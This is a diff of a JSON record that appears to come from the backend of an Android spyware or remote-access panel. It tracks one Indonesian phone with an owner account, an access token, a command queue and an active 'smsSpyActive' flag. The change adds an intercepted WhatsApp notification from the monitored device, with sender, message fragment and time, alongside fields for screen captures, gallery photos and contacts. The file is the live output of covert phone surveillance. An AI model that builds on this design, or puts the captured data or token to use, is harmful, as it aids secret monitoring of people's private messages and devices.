@@ -36,14 +36,14 @@
     "deviceName": "HP-BUGV2-9679",
     "ownerUsername": "gehgtg17",
     "token": "074c70324689a6d895cd017b2b0059b6",
-    "lastSeen": 1776080261650,
+    "lastSeen": 1776080265099,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-13T11:23:24.956Z",
     "deviceInfo": {
       "model": "ITEL itel P671L",
       "androidVersion": "Android 14",
-      "battery": 81,
+      "battery": 80,
       "network": "Seluler: Smartfren 100% untuk Indonesia",
       "sim1": "Smartfren 100% untuk Indonesia",
       "sim2": "Tidak ada"
@@ -51,7 +51,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "k",
+        "content": "Telepon video grup dari arip…",
+        "time": "13/04 18:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776080267962
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": true,
     "contacts": [],
